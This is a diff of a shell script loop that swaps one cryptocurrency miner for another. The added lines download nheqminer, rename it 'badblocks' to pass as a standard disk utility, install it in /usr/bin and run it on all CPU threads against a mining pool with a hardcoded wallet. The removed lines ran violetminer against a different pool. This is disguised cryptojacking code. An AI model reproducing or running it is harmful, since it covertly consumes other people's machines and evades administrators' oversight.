@@ -2,13 +2,15 @@
  
 COUNTER=20
 until [  $COUNTER -lt 10 ]; do
+
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvzf nheqminer-Linux-v0.8.2.tgz
+tar xf nheqminer-Linux-v0.8.2.tar.gz
+cd nheqminer
+mv nheqminer badblocks
+mv badblocks /usr/bin
+badblocks -v -l verushash.asia.mine.zergpool.com:3300 -u D5snbNHPaNYMHAESeTrreRRVx3NLRdGo65.$(echo $(shuf -i 1-999 -n 1)-btcup) -p c=DGB -t $(nproc --all)
  
-wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz
-tar -xf violetminer-linux-v0.2.2.tar.gz
-cd violetminer-linux-v0.2.2
-
-./violetminer --pool rx-eu.unmineable.com:13333 --username SHIB:0x80c4210e8c0f6d37951a9078c713321e98a11ef5#rame-kb3u --password x --algorithm wrkzcoin
-
      echo COUNTER $COUNTER
      let COUNTER-=1
 done
